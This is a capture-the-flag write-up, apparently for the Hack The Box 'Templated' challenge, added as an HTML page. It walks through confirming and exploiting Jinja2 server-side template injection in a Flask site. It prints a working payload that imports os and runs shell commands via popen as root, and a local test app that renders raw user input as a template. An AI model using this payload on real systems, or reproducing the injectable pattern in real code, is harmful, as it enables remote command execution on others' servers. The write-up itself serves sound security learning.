@@ -1,0 +1,164 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Templated</title>
+<meta name="generator" content="Org mode" />
+<link rel="stylesheet" type="text/css" href="/style.css"/>
+</head>
+<body>
+<div id="content">
+<h1 class="title">Templated</h1>
+<p>
+When you enter the given URL, you are directly presented with this text:
+</p>
+
+<pre class="example">
+Site still under construction
+Proudly powered by Flask/Jinja2
+</pre>
+
+<p>
+This information is here for a reason. You have two different technologies that
+go hand-in-hand when doing simple Python web development: Flask and Jinja2.
+</p>
+
+<p>
+First thing you can think of is that maybe Flask has some vulnerabilities that
+can be exploited. And altough that could be true, the title of the challenge is
+an hint.
+</p>
+
+<p>
+<code>Templated</code>&#x2026; and Jinja2 is a template engine. Therefore, this could be a
+challenge where you have to know how to exploit a Server Side Template Injection
+(SSTI).
+</p>
+
+<p>
+First thing we can try, to verify this is doing something like this on the
+Address Bar: <code>http://209.97.138.240:30840/{{1+1}}</code>. We are trying to check if
+<code>1+1</code> is evaluated.
+</p>
+
+<p>
+We get this after submitting the URL:
+</p>
+
+<pre class="example">
+Error 404
+The page '2' could not be found
+</pre>
+
+<p>
+It seems <code>{{1+1}}</code> was evaluated to <code>2</code>! So it is confirmed that we are able to
+do an SSTI.
+</p>
+
+<p>
+An object we can access on a GET request is called <code>request</code>.
+If we execute <code>http://209.97.138.240:30840/{{request}}</code> we get this string
+<code>&lt;Request 'http://209.97.138.240:30840/%7B%7Brequest%7D%7D' [GET]&gt;</code> which
+represents an object in Python.
+</p>
+
+<p>
+From this object, we can see its methods and attributes. We may try doing a
+request to <code>http://209.97.138.240:30840/{{dir(request)}}</code> but we will encounter
+a 500 Internal Server Error without any relevant information.
+</p>
+
+<p>
+For this, I just fired an instance of Flask on my side using the following code:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python"><span style="color: #fb4933;">from</span> flask <span style="color: #fb4933;">import</span> Flask, request, render_template_string
+
+<span style="color: #83a598;">app</span> = Flask(<span style="color: #fe8019;">__name__</span>)
+
+<span style="color: #d3869b;">@app.route</span>(<span style="color: #b8bb26;">"/"</span>)
+<span style="color: #fb4933;">def</span> <span style="color: #fabd2f;">home</span>():
+    <span style="color: #fb4933;">if</span> request.args.get(<span style="color: #b8bb26;">'c'</span>):
+        <span style="color: #fb4933;">return</span> render_template_string(request.args.get(<span style="color: #b8bb26;">'c'</span>))
+    <span style="color: #fb4933;">else</span>:
+        <span style="color: #fb4933;">print</span>(<span style="color: #fe8019;">dir</span>(request))
+        <span style="color: #fb4933;">return</span> <span style="color: #b8bb26;">"test"</span>
+
+<span style="color: #fb4933;">if</span> <span style="color: #fe8019;">__name__</span> == <span style="color: #b8bb26;">"__main__"</span>:
+    app.run(debug=<span style="color: #d3869b;">True</span>)
+</pre>
+</div>
+
+<p>
+Then I just executed <code>python app.py</code> and follow the URL.
+Then the output of `dir(request)` will be printed to the console:
+</p>
+
+<div class="org-src-container">
+<pre class="src src-python">[<span style="color: #b8bb26;">'__class__'</span>, <span style="color: #b8bb26;">'__delattr__'</span>, <span style="color: #b8bb26;">'__dict__'</span>, <span style="color: #b8bb26;">'__dir__'</span>, <span style="color: #b8bb26;">'__doc__'</span>, <span style="color: #b8bb26;">'__enter__'</span>, <span style="color: #b8bb26;">'__eq__'</span>, <span style="color: #b8bb26;">'__exit__'</span>, <span style="color: #b8bb26;">'__format__'</span>, <span style="color: #b8bb26;">'__ge__'</span>, <span style="color: #b8bb26;">'__getattribute__'</span>, <span style="color: #b8bb26;">'__gt__'</span>, <span style="color: #b8bb26;">'__hash__'</span>, <span style="color: #b8bb26;">'__init__'</span>, <span style="color: #b8bb26;">'__init_subclass__'</span>, <span style="color: #b8bb26;">'__le__'</span>, <span style="color: #b8bb26;">'__lt__'</span>, <span style="color: #b8bb26;">'__module__'</span>, <span style="color: #b8bb26;">'__ne__'</span>, <span style="color: #b8bb26;">'__new__'</span>, <span style="color: #b8bb26;">'__reduce__'</span>, <span style="color: #b8bb26;">'__reduce_ex__'</span>, <span style="color: #b8bb26;">'__repr__'</span>, <span style="color: #b8bb26;">'__setattr__'</span>, <span style="color: #b8bb26;">'__sizeof__'</span>, <span style="color: #b8bb26;">'__str__'</span>, <span style="color: #b8bb26;">'__subclasshook__'</span>, <span style="color: #b8bb26;">'__weakref__'</span>, <span style="color: #b8bb26;">'_cached_json'</span>, <span style="color: #b8bb26;">'_get_data_for_json'</span>, <span style="color: #b8bb26;">'_get_file_stream'</span>, <span style="color: #b8bb26;">'_get_stream_for_parsing'</span>, <span style="color: #b8bb26;">'_load_form_data'</span>, <span style="color: #b8bb26;">'_parse_content_type'</span>, <span style="color: #b8bb26;">'accept_charsets'</span>, <span style="color: #b8bb26;">'accept_encodings'</span>, <span style="color: #b8bb26;">'accept_languages'</span>, <span style="color: #b8bb26;">'accept_mimetypes'</span>, <span style="color: #b8bb26;">'access_control_request_headers'</span>, <span style="color: #b8bb26;">'access_control_request_method'</span>, <span style="color: #b8bb26;">'access_route'</span>, <span style="color: #b8bb26;">'application'</span>, <span style="color: #b8bb26;">'args'</span>, <span style="color: #b8bb26;">'authorization'</span>, <span style="color: #b8bb26;">'base_url'</span>, <span style="color: #b8bb26;">'blueprint'</span>, <span style="color: #b8bb26;">'cache_control'</span>, <span style="color: #b8bb26;">'charset'</span>, <span style="color: #b8bb26;">'close'</span>, <span style="color: #b8bb26;">'content_encoding'</span>, <span style="color: #b8bb26;">'content_length'</span>, <span style="color: #b8bb26;">'content_md5'</span>, <span style="color: #b8bb26;">'content_type'</span>, <span style="color: #b8bb26;">'cookies'</span>, <span style="color: #b8bb26;">'data'</span>, <span style="color: #b8bb26;">'date'</span>, <span style="color: #b8bb26;">'dict_storage_class'</span>, <span style="color: #b8bb26;">'disable_data_descriptor'</span>, <span style="color: #b8bb26;">'encoding_errors'</span>, <span style="color: #b8bb26;">'endpoint'</span>, <span style="color: #b8bb26;">'environ'</span>, <span style="color: #b8bb26;">'files'</span>, <span style="color: #b8bb26;">'form'</span>, <span style="color: #b8bb26;">'form_data_parser_class'</span>, <span style="color: #b8bb26;">'from_values'</span>, <span style="color: #b8bb26;">'full_path'</span>, <span style="color: #b8bb26;">'get_data'</span>, <span style="color: #b8bb26;">'get_json'</span>, <span style="color: #b8bb26;">'headers'</span>, <span style="color: #b8bb26;">'host'</span>, <span style="color: #b8bb26;">'host_url'</span>, <span style="color: #b8bb26;">'if_match'</span>, <span style="color: #b8bb26;">'if_modified_since'</span>, <span style="color: #b8bb26;">'if_none_match'</span>, <span style="color: #b8bb26;">'if_range'</span>, <span style="color: #b8bb26;">'if_unmodified_since'</span>, <span style="color: #b8bb26;">'input_stream'</span>, <span style="color: #b8bb26;">'is_json'</span>, <span style="color: #b8bb26;">'is_multiprocess'</span>, <span style="color: #b8bb26;">'is_multithread'</span>, <span style="color: #b8bb26;">'is_run_once'</span>, <span style="color: #b8bb26;">'is_secure'</span>, <span style="color: #b8bb26;">'json'</span>, <span style="color: #b8bb26;">'json_module'</span>, <span style="color: #b8bb26;">'list_storage_class'</span>, <span style="color: #b8bb26;">'make_form_data_parser'</span>, <span style="color: #b8bb26;">'max_content_length'</span>, <span style="color: #b8bb26;">'max_form_memory_size'</span>, <span style="color: #b8bb26;">'max_forwards'</span>, <span style="color: #b8bb26;">'method'</span>, <span style="color: #b8bb26;">'mimetype'</span>, <span style="color: #b8bb26;">'mimetype_params'</span>, <span style="color: #b8bb26;">'on_json_loading_failed'</span>, <span style="color: #b8bb26;">'origin'</span>, <span style="color: #b8bb26;">'parameter_storage_class'</span>, <span style="color: #b8bb26;">'path'</span>, <span style="color: #b8bb26;">'pragma'</span>, <span style="color: #b8bb26;">'query_string'</span>, <span style="color: #b8bb26;">'range'</span>, <span style="color: #b8bb26;">'referrer'</span>, <span style="color: #b8bb26;">'remote_addr'</span>, <span style="color: #b8bb26;">'remote_user'</span>, <span style="color: #b8bb26;">'routing_exception'</span>, <span style="color: #b8bb26;">'scheme'</span>, <span style="color: #b8bb26;">'script_root'</span>, <span style="color: #b8bb26;">'shallow'</span>, <span style="color: #b8bb26;">'stream'</span>, <span style="color: #b8bb26;">'trusted_hosts'</span>, <span style="color: #b8bb26;">'url'</span>, <span style="color: #b8bb26;">'url_charset'</span>, <span style="color: #b8bb26;">'url_root'</span>, <span style="color: #b8bb26;">'url_rule'</span>, <span style="color: #b8bb26;">'user_agent'</span>, <span style="color: #b8bb26;">'values'</span>, <span style="color: #b8bb26;">'view_args'</span>, <span style="color: #b8bb26;">'want_form_data_parsed'</span>]
+</pre>
+</div>
+
+<p>
+From here we find <code>application</code> attribute which is relevant for what we want to
+do.
+</p>
+
+<p>
+By following this logic, now there is a possibility of using
+<a href="https://www.python.org/download/releases/2.3/mro/">Python MRO</a> to our advantage do actually
+execute any shell command we want. We can import any python module by using <code>__import__</code> through the <code>request</code>
+object from Flask:
+</p>
+
+<pre class="example">
+{{request.application.__globals__.__builtins__.__import__}}
+</pre>
+
+<p>
+A module that is used to execute shell commands is <code>os</code>, where we can use the
+<code>popen</code> method. We can first try and check the id of the current user:
+</p>
+
+<pre class="example">
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+</pre>
+
+<p>
+The result is as follows:
+</p>
+
+<pre class="example">
+$ uid=0(root) gid=0(root) groups=0(root)
+</pre>
+
+<p>
+We are already root! Now let us see what `ls` gives us:
+</p>
+
+<pre class="example">
+$ ls
+bin boot dev etc flag.txt home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var
+</pre>
+
+<p>
+We can clearly see that we are on the root directory of the filesystem, which
+has a file called <code>flag.txt</code>.
+</p>
+
+<p>
+To read the flag, we just do <code>cat flag.txt</code>!
+</p>
+
+<hr>
+<footer>
+<p><a class="footer" href="/index.html">Homepage</a></p>
+<p><a class="footer" href="/writeups/htb/index.html">Back</a></p>
+</footer>
+</div>
+</body>
+</html>
